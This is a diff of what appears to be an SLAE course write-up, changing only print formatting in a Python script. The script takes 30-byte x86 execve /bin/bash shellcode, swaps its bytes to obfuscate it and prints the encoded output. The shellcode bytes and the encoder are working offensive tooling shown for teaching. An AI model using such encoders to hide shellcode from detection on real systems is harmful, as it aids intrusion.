@@ -51,16 +51,16 @@ The following Python code will be used as a shellcode wrapper to generate the ob
 shellcode = "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f"
 shellcode += "\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 
-print '\nShellcode length: %d bytes\n'  % len(shellcode)
+print 'Shellcode length: %d bytes\n'  % len(shellcode)
 s2 = ''
 
 for x in bytearray(shellcode):
     s2 += '0x%02x,' % x
 
 s2 = s2.rstrip(',')
-print 'Original shellcode:\n'
+print 'Original shellcode:'
 print s2
-print '\nObfuscated shellcode:\n'
+print '\nObfuscated shellcode:'
 
 s2n = s2.split(',')
 encoded = ''
@@ -82,15 +82,12 @@ The Python code generates the obfuscated shellcode in hex format based on the ha
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ python encoder.py 
-
 Shellcode length: 30 bytes
 
 Original shellcode:
-
 0x31,0xc0,0x50,0x68,0x62,0x61,0x73,0x68,0x68,0x62,0x69,0x6e,0x2f,0x68,0x2f,0x2f,0x2f,0x2f,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80
 
 Obfuscated shellcode:
-
 0xc0,0x31,0x68,0x50,0x61,0x62,0x68,0x73,0x62,0x68,0x6e,0x69,0x68,0x2f,0x2f,0x2f,0x2f,0x2f,0xe3,0x89,0x89,0x50,0x53,0xe2,0xe1,0x89,0x0b,0xb0,0x80,0xcd
 osboxes@osboxes:~/Downloads/SLAE$ 
 ```
